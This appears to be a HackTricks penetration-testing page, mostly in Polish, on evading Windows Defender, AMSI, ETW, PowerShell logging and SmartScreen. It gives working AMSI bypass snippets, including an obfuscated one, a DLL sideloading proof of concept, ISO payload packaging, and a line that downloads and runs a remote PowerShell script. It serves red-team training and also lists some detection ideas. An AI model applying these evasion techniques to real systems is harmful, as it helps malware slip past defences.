# Antywirus (AV) Bypass

{{#include ../banners/hacktricks-training.md}}

**Strona została napisana przez** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## Zatrzymanie Defendera

- [defendnot](https://github.com/es3n1n/defendnot): Narzędzie do zatrzymania Windows Defendera.
- [no-defender](https://github.com/es3n1n/no-defender): Narzędzie do zatrzymania Windows Defendera udając inny AV.
- [Disable Defender if you are admin](basic-powershell-for-pentesters/README.md)

## **Metodologia unikania AV**

Obecnie AVy używają różnych metod do sprawdzania, czy plik jest złośliwy, czy nie: wykrywanie statyczne, analiza dynamiczna i, w przypadku zaawansowanych EDRów, analiza behawioralna.

### **Wykrywanie statyczne**

Wykrywanie statyczne polega na oznaczaniu znanych złośliwych ciągów lub zestawów bajtów w binarnym pliku lub skrypcie, a także na wydobywaniu informacji z samego pliku (np. opis pliku, nazwa firmy, podpisy cyfrowe, ikona, suma kontrolna itp.). Oznacza to, że używanie znanych publicznych narzędzi może łatwiej doprowadzić do wykrycia, ponieważ prawdopodobnie zostały już przeanalizowane i oznaczone jako złośliwe. Istnieje kilka sposobów obejścia tego rodzaju wykrywania:

- **Encryption**

Jeśli zaszyfrujesz binarkę, AV nie będzie w stanie wykryć twojego programu, ale będziesz potrzebować jakiegoś loadera, który odszyfruje i uruchomi program w pamięci.

- **Obfuscation**

Czasami wystarczy zmienić kilka ciągów w binarce lub skrypcie, żeby przejść obok AV, ale może to być czasochłonne w zależności od tego, co próbujesz obfuskować.

- **Custom tooling**

Jeśli opracujesz własne narzędzia, nie będzie znanych sygnatur, ale zajmuje to dużo czasu i wysiłku.

> [!TIP]
> Dobrym sposobem sprawdzenia wykrywania statycznego przez Windows Defender jest [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). Dzieli on plik na wiele segmentów i następnie zleca Defenderowi przeskanowanie każdego z nich osobno, dzięki czemu może dokładnie wskazać, które ciągi lub bajty w twojej binarce są oznaczone.

Gorąco polecam sprawdzić tę [YouTube playlist](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) o praktycznym AV Evasion.

### **Analiza dynamiczna**

Analiza dynamiczna polega na uruchomieniu twojej binarki w sandboxie przez AV i obserwowaniu złośliwej aktywności (np. próby odszyfrowania i odczytania haseł z przeglądarki, wykonanie minidump na LSASS itp.). Ta część może być trudniejsza, ale oto kilka rzeczy, które możesz zrobić, aby ominąć sandboxy.

- **Sleep before execution** W zależności od implementacji może to być świetny sposób na ominięcie analizy dynamicznej AV. AVy mają bardzo krótki czas na skanowanie plików, aby nie przerywać pracy użytkownika, więc użycie długich sleepów może zaburzyć analizę binarek. Problem polega na tym, że wiele sandboxów potrafi pominąć sleep w zależności od implementacji.
- **Checking machine's resources** Zazwyczaj Sandboxes mają bardzo mało zasobów do dyspozycji (np. < 2GB RAM), w przeciwnym razie mogłyby spowolnić maszynę użytkownika. Możesz tu też wykazać się kreatywnością, np. sprawdzając temperaturę CPU lub prędkości wentylatorów — nie wszystko musi być zaimplementowane w sandboxie.
- **Machine-specific checks** Jeśli chcesz zaatakować użytkownika, którego stacja robocza jest dołączona do domeny "contoso.local", możesz sprawdzić domenę komputera, aby zobaczyć, czy pasuje do tej, którą podałeś; jeśli nie, możesz zakończyć działanie programu.

Okazuje się, że nazwa komputera sandboxa Microsoft Defender to HAL9TH, więc możesz sprawdzić nazwę komputera w swoim malware przed detonacją — jeśli nazwa zgadza się z HAL9TH, oznacza to, że jesteś wewnątrz sandboxa Defendera i możesz zakończyć działanie programu.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>source: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Kilka innych bardzo dobrych wskazówek od [@mgeeky](https://twitter.com/mariuszbit) dotyczących walki z Sandboxes

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> kanał #malware-dev</p></figcaption></figure>

Jak już wspomnieliśmy wcześniej, **public tools** w końcu zostaną **wykryte**, więc powinieneś zadać sobie pytanie:

Na przykład, jeśli chcesz zrzucić LSASS, **czy naprawdę musisz używać mimikatz**? A może możesz użyć innego projektu, mniej znanego, który też zrzuca LSASS.

Prawidłowa odpowiedź to prawdopodobnie to drugie. Biorąc mimikatz jako przykład, to prawdopodobnie jeden z — jeśli nie najbardziej — wykrywanych programów przez AVy i EDRy; sam projekt jest super, ale jest też koszmarem w kontekście obchodzenia AV, więc po prostu poszukaj alternatyw do tego, co chcesz osiągnąć.

> [!TIP]
> Podczas modyfikowania payloadów w celu uniknięcia wykrycia, upewnij się, że **wyłączyłeś automatyczne przesyłanie próbek** w Defenderze, i proszę, naprawdę, **NIE WGRYWAJ NA VIRUSTOTAL**, jeśli twoim celem jest długotrwałe unikanie detekcji. Jeśli chcesz sprawdzić, czy twój payload jest wykrywany przez konkretny AV, zainstaluj go na VM, spróbuj wyłączyć automatyczne przesyłanie próbek i testuj tam, aż będziesz zadowolony z wyniku.

## EXEs vs DLLs

Kiedy tylko to możliwe, zawsze **priorytetowo stosuj DLLs do unikania wykrycia** — z mojego doświadczenia, pliki DLL są zwykle **znacznie mniej wykrywane** i analizowane, więc to prosty trik, by w niektórych przypadkach uniknąć detekcji (oczywiście jeśli twój payload ma sposób uruchomienia się jako DLL).

Jak widać na tym obrazie, DLL Payload z Havoc ma współczynnik wykrycia 4/26 na antiscan.me, podczas gdy EXE ma 7/26.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>antiscan.me comparison of a normal Havoc EXE payload vs a normal Havoc DLL</p></figcaption></figure>

Poniżej pokażemy kilka trików, których możesz użyć z plikami DLL, aby być znacznie bardziej ukrytym.

## DLL Sideloading & Proxying

**DLL Sideloading** wykorzystuje porządek wyszukiwania DLL używany przez loader poprzez umieszczenie zarówno aplikacji ofiary, jak i złośliwych payload(s) obok siebie.

Możesz sprawdzić programy podatne na DLL Sideloading używając [Siofra](https://github.com/Cybereason/siofra) i następującego skryptu powershell:
```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
To polecenie wyświetli listę programów podatnych na DLL hijacking inside "C:\Program Files\\" oraz pliki DLL, które próbują załadować.

Gorąco polecam, abyś **explore DLL Hijackable/Sideloadable programs yourself**, ta technika jest dość dyskretna jeśli wykonana poprawnie, ale jeśli użyjesz publicznie znanych DLL Sideloadable programs, możesz łatwo zostać złapany.

Sam fakt umieszczenia złośliwej DLL o nazwie, której program oczekuje przy ładowaniu, nie sprawi, że załaduje ona twój payload, ponieważ program oczekuje konkretnych funkcji w tej DLL; aby rozwiązać ten problem użyjemy innej techniki zwanej **DLL Proxying/Forwarding**.

**DLL Proxying** przekierowuje wywołania, które program wykonuje z proxy (i złośliwej) DLL do oryginalnej DLL, zachowując tym samym funkcjonalność programu i umożliwiając obsługę wykonania twojego payload.

Będę korzystać z projektu [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) autorstwa [@flangvik](https://twitter.com/Flangvik/)

Oto kroki, które wykonałem:
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
Ostatnie polecenie da nam 2 pliki: szablon kodu źródłowego DLL oraz oryginalną, przemianowaną bibliotekę DLL.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
Oto wyniki:

<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Zarówno nasz shellcode (zakodowany za pomocą [SGN](https://github.com/EgeBalci/sgn)) jak i proxy DLL mają wskaźnik wykrywalności 0/26 na [antiscan.me](https://antiscan.me)! Nazwałbym to sukcesem.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Gorąco polecam obejrzeć [S3cur3Th1sSh1t's twitch VOD](https://www.twitch.tv/videos/1644171543) o DLL Sideloading, a także [ippsec's video](https://www.youtube.com/watch?v=3eROsG_WNpE), aby dowiedzieć się więcej o tym, co omówiliśmy bardziej szczegółowo.

### Abusing Forwarded Exports (ForwardSideLoading)

Windows PE modules mogą eksportować funkcje, które są tak naprawdę "forwarders": zamiast wskazywać na kod, wpis eksportu zawiera ciąg ASCII w formacie `TargetDll.TargetFunc`. Gdy wywołujący rozwiązuje eksport, Windows loader:

- Ładuje `TargetDll`, jeśli nie jest już załadowany
- Rozwiązuje `TargetFunc` z niego

Kluczowe zachowania do zrozumienia:
- Jeśli `TargetDll` jest KnownDLL, jest dostarczany z chronionej przestrzeni nazw KnownDLLs (np. ntdll, kernelbase, ole32).
- Jeśli `TargetDll` nie jest KnownDLL, używany jest normalny porządek wyszukiwania DLL, który obejmuje katalog modułu wykonującego forward resolution.

To umożliwia pośrednią technikę sideloadingu: znajdź podpisany DLL, który eksportuje funkcję przekierowaną do nazwy modułu niebędącej KnownDLL, a następnie umieść obok tego podpisanego DLL DLL kontrolowany przez atakującego o dokładnie takiej samej nazwie jak docelowy moduł forwardu. Gdy wywołany zostanie forwarded export, loader rozwiąże forward i załaduje twój DLL z tego samego katalogu, wykonując twój DllMain.

Przykład zaobserwowany na Windows 11:
```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```
`NCRYPTPROV.dll` nie jest KnownDLL, więc jest rozwiązywany zgodnie z normalną kolejnością wyszukiwania.

PoC (kopiuj-wklej):
1) Skopiuj podpisany systemowy plik DLL do folderu, do którego można zapisywać pliki.
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) Umieść złośliwy `NCRYPTPROV.dll` w tym samym folderze. Minimalny `DllMain` wystarczy, aby uzyskać wykonanie kodu; nie musisz implementować przekierowanej funkcji, aby wywołać `DllMain`.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
if (reason == DLL_PROCESS_ATTACH){
HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}
}
return TRUE;
}
```
3) Wyzwól przekierowanie za pomocą podpisanego LOLBin:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```
Zaobserwowane zachowanie:
- rundll32 (signed) ładuje side-by-side `keyiso.dll` (signed)
- Podczas rozwiązywania `KeyIsoSetAuditingInterface`, loader podąża za forwardem do `NCRYPTPROV.SetAuditingInterface`
- Następnie loader ładuje `NCRYPTPROV.dll` z `C:\test` i wykonuje jego `DllMain`
- Jeśli `SetAuditingInterface` nie jest zaimplementowana, otrzymasz błąd "missing API" dopiero po tym, jak `DllMain` już się wykona

Hunting tips:
- Skup się na forwarded exports, gdzie docelowy moduł nie jest KnownDLL. KnownDLLs są wymienione pod `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs`.
- Możesz enumerować forwarded exports za pomocą narzędzi takich jak:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Zobacz inwentarz forwarderów Windows 11, aby wyszukać kandydatów: https://hexacorn.com/d/apis_fwd.txt

Detection/defense ideas:
- Monitoruj LOLBins (e.g., rundll32.exe) ładujące podpisane DLL z poza katalogów systemowych, a następnie ładujące non-KnownDLLs o tej samej nazwie bazowej z tego katalogu
- Wydawaj alert dla łańcuchów procesów/modułów, np.: `rundll32.exe` → non-system `keyiso.dll` → `NCRYPTPROV.dll` w ścieżkach zapisywalnych przez użytkownika
- Wymuś polityki integralności kodu (WDAC/AppLocker) i zablokuj zapis i wykonywanie w katalogach aplikacji

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze is a payload toolkit for bypassing EDRs using suspended processes, direct syscalls, and alternative execution methods`

Możesz użyć Freeze, aby załadować i wykonać swój shellcode w sposób ukryty.
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Ewazja to gra w kotka i myszkę — to, co działa dziś, może być wykryte jutro, więc nigdy nie polegaj tylko na jednym narzędziu; jeśli to możliwe, łącz kilka technik omijania.

## AMSI (Anti-Malware Scan Interface)

AMSI zostało stworzone, aby zapobiegać "[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)". Początkowo antywirusy potrafiły skanować tylko pliki na dysku, więc jeśli w jakiś sposób udało się uruchomić payloady bezpośrednio w pamięci, AV nie mógł nic zrobić, ponieważ nie miał wystarczającej widoczności.

Funkcja AMSI jest zintegrowana z następującymi składnikami Windows.

- User Account Control, or UAC (elevation of EXE, COM, MSI, or ActiveX installation)
- PowerShell (skrypty, użycie interaktywne oraz dynamiczna ewaluacja kodu)
- Windows Script Host (wscript.exe and cscript.exe)
- JavaScript and VBScript
- Office VBA macros

Pozwala to rozwiązaniom antywirusowym na analizę zachowania skryptów poprzez udostępnienie zawartości skryptów w formie niezaszyfrowanej i niezobfuskowanej.

Uruchomienie `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` spowoduje następujące ostrzeżenie w programie Windows Defender.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Zwróć uwagę, że poprzedza to `amsi:` a następnie ścieżkę do pliku wykonywalnego, z którego uruchomiono skrypt — w tym przypadku powershell.exe

Nie zapisaliśmy żadnego pliku na dysku, a mimo to zostaliśmy wykryci w pamięci ze względu na AMSI.

Ponadto, począwszy od **.NET 4.8**, kod C# również jest uruchamiany przez AMSI. Dotyczy to nawet `Assembly.Load(byte[])` używanego do ładowania do pamięci. Dlatego zaleca się używanie starszych wersji .NET (np. 4.7.2 lub niżej) dla wykonywania w pamięci, jeśli chcesz ominąć AMSI.

Jest kilka sposobów na obejście AMSI:

- **Obfuscation**

Ponieważ AMSI działa głównie na podstawie wykryć statycznych, modyfikowanie skryptów, które próbujesz załadować, może być dobrą metodą na uniknięcie wykrycia.

Jednak AMSI ma zdolność deobfuskacji skryptów nawet przy wielu warstwach obfuskacji, więc obfuskacja może okazać się złym wyborem w zależności od sposobu jej wykonania. To sprawia, że omijanie nie jest trywialne. Czasami jednak wystarczy zmienić kilka nazw zmiennych i będzie OK — zależy to od tego, na ile coś zostało oznaczone.

- **AMSI Bypass**

Ponieważ AMSI jest implementowane przez załadowanie DLL do procesu powershell (również cscript.exe, wscript.exe itp.), możliwe jest jego manipulowanie nawet podczas działania jako użytkownik bez uprawnień. Z powodu tej wady w implementacji AMSI, badacze znaleźli wiele sposobów na ominięcie skanowania AMSI.

**Forcing an Error**

Wymuszenie niepowodzenia inicjalizacji AMSI (amsiInitFailed) spowoduje, że dla bieżącego procesu nie zostanie uruchomione skanowanie. Początkowo zostało to ujawnione przez [Matt Graeber](https://twitter.com/mattifestation) i Microsoft opracował sygnaturę, aby zapobiec szerokiemu stosowaniu tej techniki.
```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
Wystarczyła jedna linia kodu powershell, aby uczynić AMSI bezużytecznym dla bieżącego procesu powershell. Ta linia została oczywiście wykryta przez samo AMSI, więc konieczna jest pewna modyfikacja, aby móc użyć tej techniki.

Oto zmodyfikowany AMSI bypass, który wziąłem z tego [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db).
```bash
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
Keep in mind, that this will probably get flagged once this post comes out, so you should not publish any code if your plan is staying undetected.

**Memory Patching**

Ta technika została pierwotnie odkryta przez [@RastaMouse](https://twitter.com/_RastaMouse/) i polega na znalezieniu adresu funkcji "AmsiScanBuffer" w amsi.dll (odpowiedzialnej za scanning danych dostarczonych przez użytkownika) i nadpisaniu jej instrukcjami zwracającymi kod E_INVALIDARG — w ten sposób wynik rzeczywistego skanu będzie 0, co jest interpretowane jako clean result.

> [!TIP]
> Please read [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) for a more detailed explanation.

There are also many other techniques used to bypass AMSI with powershell, check out [**this page**](basic-powershell-for-pentesters/index.html#amsi-bypass) and [**this repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) to learn more about them.

### Blocking AMSI by preventing amsi.dll load (LdrLoadDll hook)

AMSI is initialised only after `amsi.dll` is loaded into the current process. A robust, language‑agnostic bypass is to place a user‑mode hook on `ntdll!LdrLoadDll` that returns an error when the requested module is `amsi.dll`. As a result, AMSI never loads and no scans occur for that process.

Implementation outline (x64 C/C++ pseudocode):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
if (module && module->Buffer){
UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
if (RtlEqualUnicodeString(module, &amsi, TRUE)){
// Pretend the DLL cannot be found → AMSI never initialises in this process
return STATUS_DLL_NOT_FOUND; // 0xC0000135
}
}
return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
// Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
// e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
Notes
- Działa zarówno w PowerShell, WScript/CScript, jak i w niestandardowych loaderach (we wszystkich przypadkach, które w przeciwnym razie załadowałyby AMSI).
- Stosować razem z podawaniem skryptów przez stdin (`PowerShell.exe -NoProfile -NonInteractive -Command -`), aby uniknąć długich artefaktów w linii poleceń.
- Zauważone użycie przez loadery uruchamiane za pomocą LOLBins (np. `regsvr32` wywołujące `DllRegisterServer`).

To narzędzie [https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail) również generuje skrypt to bypass AMSI.

**Remove the detected signature**

Możesz użyć narzędzia takiego jak **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** i **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)**, aby usunąć wykrytą sygnaturę AMSI z pamięci bieżącego procesu. Narzędzie działa poprzez skanowanie pamięci bieżącego procesu w poszukiwaniu sygnatury AMSI, a następnie nadpisanie jej instrukcjami NOP, skutecznie usuwając ją z pamięci.

**AV/EDR products that uses AMSI**

Listę produktów AV/EDR wykorzystujących AMSI znajdziesz w **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)**.

**Use Powershell version 2**
Jeśli użyjesz PowerShell w wersji 2, AMSI nie zostanie załadowany, więc możesz uruchamiać skrypty bez skanowania przez AMSI. Możesz to zrobić:
```bash
powershell.exe -version 2
```
## Logowanie PS

PowerShell logging to funkcja, która pozwala rejestrować wszystkie polecenia PowerShell wykonywane na systemie. Może to być przydatne do audytu i rozwiązywania problemów, ale może też stanowić **problem dla atakujących, którzy chcą unikać wykrycia**.

Aby obejść logowanie PowerShell, możesz użyć następujących technik:

- **Wyłącz PowerShell Transcription i Module Logging**: Możesz użyć narzędzia takiego jak [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) w tym celu.
- **Użyj Powershell w wersji 2**: Jeśli użyjesz PowerShell w wersji 2, AMSI nie zostanie załadowany, więc możesz uruchamiać swoje skrypty bez skanowania przez AMSI. Zrób to tak: `powershell.exe -version 2`
- **Użyj niezarządzanej sesji Powershell**: Użyj [https://github.com/leechristensen/UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) aby uruchomić powershell bez obron (this is what `powerpick` from Cobal Strike uses).


## Obfuskacja

> [!TIP]
> Kilka technik obfuskacji polega na szyfrowaniu danych, co zwiększa entropię binarki i może ułatwić jej wykrycie przez AV i EDR. Bądź ostrożny z tym i rozważ stosowanie szyfrowania tylko w konkretnych sekcjach kodu, które są wrażliwe lub które muszą być ukryte.

### Deobfuskacja binarek .NET chronionych przez ConfuserEx

Podczas analizy malware używającego ConfuserEx 2 (lub komercyjnych forków) często napotykamy kilka warstw ochrony, które blokują dekompilery i sandboxy. Poniższy workflow niezawodnie **przywraca niemal oryginalny IL**, który potem można zdekompilować do C# w narzędziach takich jak dnSpy lub ILSpy.

1.  Usuwanie ochrony antymanipulacyjnej – ConfuserEx szyfruje każde *method body* i odszyfrowuje je wewnątrz statycznego konstruktora modułu (`<Module>.cctor`). To również modyfikuje checksumę PE, więc każda modyfikacja spowoduje awarię binarki. Użyj **AntiTamperKiller** aby zlokalizować zaszyfrowane tabele metadanych, odzyskać klucze XOR i przepisać czysty assembly:
```bash
# https://github.com/wwh1004/AntiTamperKiller
python AntiTamperKiller.py Confused.exe Confused.clean.exe
```
Output zawiera 6 parametrów anti-tamper (`key0-key3`, `nameHash`, `internKey`), które mogą być przydatne przy budowaniu własnego unpackera.

2.  Odzyskiwanie symboli i przepływu sterowania – podaj *czysty* plik do **de4dot-cex** (fork de4dot świadomy ConfuserEx).
```bash
de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
```
Flags:
• `-p crx` – wybierz profil ConfuserEx 2
• de4dot cofnie control-flow flattening, przywróci oryginalne namespaces, klasy i nazwy zmiennych oraz odszyfruje stałe stringi.

3.  Usuwanie wywołań proxy – ConfuserEx zastępuje bezpośrednie wywołania metod lekkimi wrapperami (tzw. *proxy calls*), aby dodatkowo utrudnić dekompilację. Usuń je za pomocą **ProxyCall-Remover**:
```bash
ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
```
Po tym kroku powinieneś zobaczyć normalne API .NET, takie jak `Convert.FromBase64String` czy `AES.Create()` zamiast nieczytelnych wrapperów (`Class8.smethod_10`, …).

4.  Ręczne czyszczenie – uruchom otrzymaną binarkę w dnSpy, wyszukaj duże bloby Base64 lub użycie `RijndaelManaged`/`TripleDESCryptoServiceProvider`, aby zlokalizować *prawdziwy* ładunek. Często malware przechowuje go jako TLV-encoded byte array zainicjalizowaną wewnątrz `<Module>.byte_0`.

Powyższy łańcuch przywraca przepływ wykonania **bez** potrzeby uruchamiania złośliwego sample – przydatne przy pracy na offline'owej stacji roboczej.

> 🛈  ConfuserEx tworzy custom attribute o nazwie `ConfusedByAttribute`, który może być użyty jako IOC do automatycznej triage próbek.

#### Jednolinijkowiec
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```
---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): Celem tego projektu jest dostarczenie open-source fork zestawu kompilacyjnego [LLVM](http://www.llvm.org/) zdolnego do zwiększenia bezpieczeństwa oprogramowania poprzez [code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) oraz zabezpieczenie przed manipulacjami.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator demonstruje, jak użyć języka `C++11/14` do generowania, w czasie kompilacji, obfuscated code bez użycia żadnego zewnętrznego narzędzia i bez modyfikowania kompilatora.
- [**obfy**](https://github.com/fritzone/obfy): Dodaje warstwę obfuscated operations generowanych przez framework C++ template metaprogramming, co utrudni analizę osobie próbującej złamać aplikację.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz to x64 binary obfuscator, który potrafi obfuskować różne pliki pe, w tym: .exe, .dll, .sys
- [**metame**](https://github.com/a0rtega/metame): Metame to prosty metamorphic code engine dla dowolnych executables.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator to drobiazgowy framework do code obfuscation dla języków wspieranych przez LLVM wykorzystujący ROP (return-oriented programming). ROPfuscator obfuskatuje program na poziomie kodu assembly, transformując zwykłe instrukcje w ROP chains, podważając nasze naturalne postrzeganie normalnego przepływu sterowania.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt to .NET PE Crypter napisany w Nim
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor potrafi konwertować istniejące EXE/DLL do shellcode, a następnie je załadować

## SmartScreen & MoTW

You may have seen this screen when downloading some executables from the internet and executing them.

Microsoft Defender SmartScreen is a security mechanism intended to protect the end user against running potentially malicious applications.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen mainly works with a reputation-based approach, meaning that uncommonly download applications will trigger SmartScreen thus alerting and preventing the end user from executing the file (although the file can still be executed by clicking More Info -> Run anyway).

**MoTW** (Mark of The Web) is an [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) with the name of Zone.Identifier which is automatically created upon download files from the internet, along with the URL it was downloaded from.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>Sprawdzanie Zone.Identifier ADS dla pliku pobranego z internetu.</p></figcaption></figure>

> [!TIP]
> Ważne jest, aby pamiętać, że executables podpisane za pomocą **trusted** signing certificate **won't trigger SmartScreen**.

Bardzo skutecznym sposobem, aby zapobiec otrzymaniu przez twoje payloads Mark of The Web, jest spakowanie ich do jakiegoś kontenera, np. ISO. Dzieje się tak, ponieważ Mark-of-the-Web (MOTW) **cannot** być zastosowany do **non NTFS** woluminów.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) is a tool that packages payloads into output containers to evade Mark-of-the-Web.

Example usage:
```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
Here is a demo for bypassing SmartScreen by packaging payloads inside ISO files using [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) to potężny mechanizm logowania w Windows, który pozwala aplikacjom i komponentom systemowym na **logowanie zdarzeń**. Jednak może być także wykorzystywany przez produkty zabezpieczające do monitorowania i wykrywania złośliwej aktywności.

Podobnie jak w przypadku wyłączania (omijania) AMSI, możliwe jest również sprawienie, aby funkcja użytkowego procesu **`EtwEventWrite`** zwracała natychmiastowo bez logowania jakichkolwiek zdarzeń. Osiąga się to przez patche'owanie funkcji w pamięci, aby zwracała od razu, skutecznie wyłączając logowanie ETW dla tego procesu.

Więcej informacji znajdziesz w **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) and [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.


## C# Assembly Reflection

Ładowanie binarek C# do pamięci jest znane od dłuższego czasu i nadal jest świetnym sposobem uruchamiania narzędzi post-exploitation bez wykrycia przez AV.

Ponieważ payload jest ładowany bezpośrednio do pamięci bez zapisywania na dysku, musimy martwić się jedynie o patchowanie AMSI dla całego procesu.

